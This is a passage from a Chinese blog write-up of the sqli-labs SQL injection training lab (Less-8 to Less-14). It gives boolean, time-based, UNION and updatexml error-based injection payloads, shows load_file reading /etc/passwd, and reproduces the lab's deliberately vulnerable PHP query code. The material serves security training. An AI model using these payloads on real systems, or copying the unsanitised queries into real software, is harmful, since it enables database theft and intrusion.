表示不对mysqld 的导入|导出做限制</span><br></pre></td></tr></table></figure><h3 id="读文件"><a href="#读文件" class="headerlink" title="读文件"></a>读文件</h3><p>我们也可以读文件</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> <span class="keyword">user</span>(cmd <span class="built_in">text</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> <span class="keyword">user</span>(cmd) <span class="keyword">values</span> (<span class="keyword">load_file</span>(<span class="string">&#x27;/etc/passwd&#x27;</span>));</span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">user</span>;</span><br></pre></td></tr></table></figure><p>也可以用</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">load</span> <span class="keyword">data</span> <span class="keyword">infile</span> <span class="string">&#x27;/etc/passwd&#x27;</span> <span class="keyword">into</span> <span class="keyword">table</span> <span class="keyword">user</span>;</span><br><span class="line"><span class="keyword">load</span> <span class="keyword">data</span> <span class="keyword">local</span> <span class="keyword">infile</span> <span class="string">&#x27;/etc/passwd&#x27;</span> <span class="keyword">into</span> <span class="keyword">table</span> test.test <span class="keyword">fields</span> <span class="keyword">terminated</span> <span class="keyword">by</span> <span class="string">&#x27;\n&#x27;</span>;</span><br></pre></td></tr></table></figure><h3 id="关键代码-6"><a href="#关键代码-6" class="headerlink" title="关键代码"></a>关键代码</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">$sql=<span class="string">&quot;SELECT * FROM users WHERE id=((&#x27;<span class="subst">$id</span>&#x27;)) LIMIT 0,1&quot;</span>;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">$row = mysql_fetch_array($result);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($row)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;You are in.... Use outfile......&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;You have an error in your SQL syntax&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Less-8"><a href="#Less-8" class="headerlink" title="Less-8"></a>Less-8</h2><p>题目考察的是bool盲注，当然也可用时间盲注，能用bool尽量用，速度比较快</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">1</span><span class="string">&#x27; and if(0,1,0)%23</span></span><br><span class="line"><span class="string">?id=1&#x27;</span> <span class="keyword">and</span> <span class="keyword">if</span>(<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>)%<span class="number">23</span></span><br></pre></td></tr></table></figure><p>两个url返回的结果不一样，因此我们可以在if的第一个参数注入</p><h3 id="关键代码-7"><a href="#关键代码-7" class="headerlink" title="关键代码"></a>关键代码</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$sql=<span class="string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">$row = mysql_fetch_array($result);</span><br><span class="line"><span class="keyword">if</span>($row)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;You are in...........&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&lt;/font&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#0000ff&quot; font size= 3&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Less-9"><a href="#Less-9" class="headerlink" title="Less-9"></a>Less-9</h2><p>题目考察的是时间盲注</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">1</span><span class="string">&#x27; and if(0,sleep(3),0)%23</span></span><br><span class="line"><span class="string">?id=1&#x27;</span> <span class="keyword">and</span> <span class="keyword">if</span>(<span class="number">1</span>,sleep(<span class="number">3</span>),<span class="number">0</span>)%<span class="number">23</span></span><br></pre></td></tr></table></figure><p>和Less-8差不多的payload，这题不能用bool盲注的原因是两种请求返回的结果一样，无法根据页面内容判断是否sql语句是否恰好满足条件</p><h3 id="关键代码-8"><a href="#关键代码-8" class="headerlink" title="关键代码"></a>关键代码</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$sql=<span class="string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">$row = mysql_fetch_array($result);</span><br><span class="line"><span class="keyword">if</span>($row)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;You are in...........&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;You are in...........&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Less-10"><a href="#Less-10" class="headerlink" title="Less-10"></a>Less-10</h2><p>还是时间盲注，只不过需要用<code>&quot;</code>闭合</p><h3 id="关键代码-9"><a href="#关键代码-9" class="headerlink" title="关键代码"></a>关键代码</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">$id = <span class="string">&#x27;&quot;&#x27;</span>.$id.<span class="string">&#x27;&quot;&#x27;</span>;</span><br><span class="line">$sql=<span class="string">&quot;SELECT * FROM users WHERE id=<span class="subst">$id</span> LIMIT 0,1&quot;</span>;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">$row = mysql_fetch_array($result);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($row)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;You are in...........&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;You are in...........&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&lt;/font&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#0000ff&quot; font size= 3&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Less-11"><a href="#Less-11" class="headerlink" title="Less-11"></a>Less-11</h2><p>POST注入，和Less-1差不多，只是接收参数的方式不同，order by判断列数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">POSTuname=admin<span class="string">&#x27; order by 2%23&amp;passwd=aaa&amp;submit=Submit</span></span><br></pre></td></tr></table></figure><p>通过响应长度的不同可以判断有两列</p><img src="/2019/10/17/sqli-labs-wp/TIM截图20200427154216.png" style="zoom:80%;"><p>联合查询，回显在登陆之后界面上</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">POSTuname=asdf<span class="string">&#x27; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database())%23&amp;passwd=aaa&amp;submit=Submit</span></span><br></pre></td></tr></table></figure><img src="/2019/10/17/sqli-labs-wp/TIM截图20200427155905.png" style="zoom:80%;"><p>接着又是爆字段，爆内容那种了</p><p>也可以报错注入</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">POSTuname=asdf<span class="string">&#x27; and updatexml(1,concat(0x3a,(select user())),1)%23&amp;passwd=aaa&amp;submit=Submit</span></span><br></pre></td></tr></table></figure><img src="/2019/10/17/sqli-labs-wp/TIM截图20200427160321.png" style="zoom:67%;"><h3 id="关键代码-10"><a href="#关键代码-10" class="headerlink" title="关键代码"></a>关键代码</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">@$sql=<span class="string">&quot;SELECT username, password FROM users WHERE username=&#x27;<span class="subst">$uname</span>&#x27; and password=&#x27;<span class="subst">$passwd</span>&#x27; LIMIT 0,1&quot;</span>;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">$row = mysql_fetch_array($result);</span><br><span class="line"><span class="keyword">if</span>($row)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#FFFF00&quot; font size = 4&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;font size=&quot;3&quot; color=&quot;#0000ff&quot;&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Your Login name:&#x27;</span>. $row[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Your Password:&#x27;</span> .$row[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;img src=&quot;../images/flag.jpg&quot;  /&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>  </span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#0000ff&quot; font size=&quot;3&quot;&gt;&#x27;</span>;</span><br><span class="line">    print_r(mysql_error());</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;img src=&quot;../images/slap.jpg&quot; /&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Less-12"><a href="#Less-12" class="headerlink" title="Less-12"></a>Less-12</h2><p>和Less-11差不多，闭合方式不同而已，加个单或双引号试试，从报错信息就能猜出后台sql语句</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">uname&#x3D;aaa&quot;&amp;passwd&#x3D;bbb&amp;submit&#x3D;Submit</span><br><span class="line"></span><br><span class="line">the right syntax to use near &#39;bbb&quot;) LIMIT 0,1&#39; at line 1</span><br></pre></td></tr></table></figure><p>猜测我们加的<code>&quot;</code>与前面的闭合，本来有的影响后面的</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> username, <span class="keyword">password</span> <span class="keyword">FROM</span> <span class="keyword">users</span> <span class="keyword">WHERE</span> username=(<span class="string">&quot;aaa&quot;&quot;) and password=(&quot;</span>bbb<span class="string">&quot;) LIMIT 0,1</span></span><br></pre></td></tr></table></figure><p>所以构造</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=aaa<span class="string">&quot;) union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database())%23&amp;passwd=sad&amp;submit=Submit</span></span><br></pre></td></tr></table></figure><p>接着就和Less-11差不多了</p><h3 id="关键代码-11"><a href="#关键代码-11" class="headerlink" title="关键代码"></a>关键代码</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">$uname=<span class="string">&#x27;&quot;&#x27;</span>.$uname.<span class="string">&#x27;&quot;&#x27;</span>;</span><br><span class="line">$passwd=<span class="string">&#x27;&quot;&#x27;</span>.$passwd.<span class="string">&#x27;&quot;&#x27;</span>;</span><br><span class="line">@$sql=<span class="string">&quot;SELECT username, password FROM users WHERE username=(<span class="subst">$uname</span>) and password=(<span class="subst">$passwd</span>) LIMIT 0,1&quot;</span>;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">$row = mysql_fetch_array($result);</span><br><span class="line"><span class="keyword">if</span>($row)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#FFFF00&quot; font size = 4&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;font size=&quot;3&quot; color=&quot;#0000ff&quot;&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Your Login name:&#x27;</span>. $row[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Your Password:&#x27;</span> .$row[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;img src=&quot;../images/flag.jpg&quot;   /&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#0000ff&quot; font size=&quot;3&quot;&gt;&#x27;</span>;</span><br><span class="line">print_r(mysql_error());</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;img src=&quot;../images/slap.jpg&quot;   /&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Less-13"><a href="#Less-13" class="headerlink" title="Less-13"></a>Less-13</h2><p>还是加单双引号让它报错</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">uname&#x3D;aaa&#39;&amp;passwd&#x3D;bbb&amp;submit&#x3D;Submit</span><br><span class="line"> </span><br><span class="line">the right syntax to use near &#39;bbb&#39;) LIMIT 0,1&#39; at line 1</span><br></pre></td></tr></table></figure><p>猜测我们加的<code>&#39;</code>与前面的闭合，本来有的影响后面的</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> username, <span class="keyword">password</span> <span class="keyword">FROM</span> <span class="keyword">users</span> <span class="keyword">WHERE</span> username=(<span class="string">&#x27;aaa&#x27;&#x27;) and password=(&#x27;</span>bbb<span class="string">&#x27;) LIMIT 0,1</span></span><br></pre></td></tr></table></figure><p>这个好像没有回显，所以我们只能报错和盲注两种了</p><p>先看报错，构造</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname&#x3D;admin&#39;)  and updatexml(1,concat(0x3a,(select user())),1)%23&amp;passwd&#x3D;dsa&amp;submit&#x3D;Submit</span><br></pre></td></tr></table></figure><img src="/2019/10/17/sqli-labs-wp/TIM截图20200427165732.png" style="zoom:80%;"><p>再看看盲注，可以用bool盲注,根据长度的不同判断，构造</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">uname=admin<span class="string">&#x27;) and substr((select database()),1,1)=&#x27;</span>s<span class="string">&#x27;%23&amp;passwd=dsa&amp;submit=Submit</span></span><br><span class="line"><span class="string">或</span></span><br><span class="line"><span class="string">uname=aaa&#x27;</span>) <span class="keyword">or</span> substr((select database()),<span class="number">1</span>,<span class="number">1</span>)=<span class="string">&#x27;s&#x27;</span>%<span class="number">23</span>&amp;passwd=bbb&amp;submit=Submit</span><br></pre></td></tr></table></figure><p>注意如果uname用admin,即表里面存在的值中间就不能用or，后面的会不执行，并且sleep(3)执行之后返回0</p><img src="/2019/10/17/sqli-labs-wp/TIM截图20200427173016.png" style="zoom:80%;"><img src="/2019/10/17/sqli-labs-wp/TIM截图20200427171110.png" style="zoom: 80%;"><p>如果前面的是0，我们再试下</p><img src="/2019/10/17/sqli-labs-wp/TIM截图20200427172831.png" style="zoom: 80%;"><p>但是我发现报错注入好像没这个限制</p><img src="/2019/10/17/sqli-labs-wp/TIM截图20200427171228.png" style="zoom:80%;"><h3 id="关键代码-12"><a href="#关键代码-12" class="headerlink" title="关键代码"></a>关键代码</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">@$sql=<span class="string">&quot;SELECT username, password FROM users WHERE username=(&#x27;<span class="subst">$uname</span>&#x27;) and password=(&#x27;<span class="subst">$passwd</span>&#x27;) LIMIT 0,1&quot;</span>;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">$row = mysql_fetch_array($result);</span><br><span class="line"><span class="keyword">if</span>($row)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#FFFF00&quot; font size = 4&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;font size=&quot;3&quot; color=&quot;#0000ff&quot;&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;img src=&quot;../images/flag.jpg&quot;   /&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#0000ff&quot; font size=&quot;3&quot;&gt;&#x27;</span>;</span><br><span class="line">print_r(mysql_error());</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;img src=&quot;../images/slap.jpg&quot;   /&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Less-14"><a href="#Less-14" class="headerlink" title="Less-14"></a>Less-14</h2><p>加双引号报错</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">uname&#x3D;aaa&quot;&amp;passwd&#x3D;bbb&amp;submit&#x3D;Submit</span><br><span class="line"></span><br><span class="line">the right syntax to use near &#39;bbb&quot; LIMIT 0,1&#39; at line 1</span><br></pre></td></tr></table></figure><p>猜测后台sql语句</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> username, <span class="keyword">password</span> <span class="keyword">FROM</span> <span class="keyword">users</span> <span class="keyword">WHERE</span> username=<span class="string">&quot;aaa&quot;&quot; and password=&quot;</span>bbb<span class="string">&quot; LIMIT 0,1</span></span><br></pre></td></tr></table></figure><p>尝试可以报错注入</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=aaa<span class="string">&quot; and updatexml(1,concat(0x3a,(select user())),1)%23&amp;passwd=bbb&amp;submit=Submit</span></span><br></pre></td></tr></table></figure><p><img src="/2019/10/17/sqli-labs-wp/TIM%E6%88%AA%E5%9B%BE20200427172051.png"></p><p>尝试布尔盲注</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=aaa<span class="string">&quot; or substr((select database()),1,1)=&#x27;s&#x27;%23&amp;passwd=bbb&amp;submit=Submit</span></span><br></pre></td></tr></table></figure><h3 id="关键代码-13"><a href="#关键代码-13" class="headerlink" title="关键代码"></a>关键代码</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">$uname=<span class="string">&#x27;&quot;&#x27;</span>.$uname.<span class="string">&#x27;&quot;&#x27;</span>;</span><br><span class="line">$passwd=<span class="string">&#x27;&quot;&#x27;</span>.$passwd.<span class="string">&#x27;&quot;&#x27;</span>;</span><br><span class="line">@$sql=<span class="string">&quot;SELECT username, password FROM users WHERE username=<span class="subst">$uname</span> and password=<span class="subst">$passwd</span> LIMIT 0,1&quot;</span>;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">$row = mysql_fetch_array($result);</span><br><span class="line"><span class="keyword">if</span>($row)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#FFFF00&quot; font size = 4&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;font size=&quot;3&quot; color=&quot;#0000ff&quot;&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;img src=&quot;../images/flag.jpg&quot; /&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span 